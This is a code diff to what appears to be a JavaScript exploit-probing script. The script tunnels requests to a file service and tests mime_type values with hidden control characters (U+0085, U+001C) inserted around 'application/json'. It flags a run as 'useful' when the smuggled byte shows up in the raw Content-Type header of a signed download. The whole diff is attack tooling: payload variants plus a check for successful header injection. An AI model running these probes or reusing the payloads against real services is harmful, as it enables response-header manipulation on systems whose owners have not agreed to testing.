@@ -101,10 +101,11 @@ function startSshTunnel(localPort) {
   const sourceUrl = (label) => `https://${tunnel.host}/${encodeURIComponent(label)}`;
   console.log('TUNNEL ' + tunnel.host);
   const variants = [
-    {label: 'v7-nomime', fields: {version: 7}},
-    {label: 'v7-emptymime', fields: {version: 7, mime_type: ''}},
-    {label: 'v6-nomime', fields: {version: 6}},
-    {label: 'v7-octet', fields: {version: 7, mime_type: 'application/octet-stream'}},
+    {label: 'u85prefix', fields: {version: 7, mime_type: '\u0085application/json'}},
+    {label: 'u85suffix', fields: {version: 7, mime_type: 'application/json\u0085'}},
+    {label: 'u85octet', fields: {version: 7, mime_type: '\u0085application/octet-stream'}},
+    {label: 'u1cprefix', fields: {version: 7, mime_type: '\u001capplication/json'}},
+    {label: 'u85both', fields: {version: 7, mime_type: '\u0085application/json\u0085'}},
   ];
   try {
     for (const variant of variants) {
@@ -128,8 +129,8 @@ function startSshTunnel(localPort) {
             out.rsct = new URL(download).searchParams.get('rsct');
             const raw = await rawTlsGet(download);
             out.ctHex = raw.raw ? ctLines(raw.raw) : raw.error;
-            const ATOM = '85' + Buffer.from('application/json').toString('hex');
-            out.useful = Array.isArray(out.ctHex) && out.ctHex.some((h) => h.includes(ATOM));
+            const ATOM = '85' + Buffer.from('application/json').toString('hex'); const ATOMOCT = '85' + Buffer.from('application/octet-stream').toString('hex');
+            out.useful = Array.isArray(out.ctHex) && out.ctHex.some((h) => h.includes(ATOM) || h.includes(ATOMOCT));
           }
         }
       }
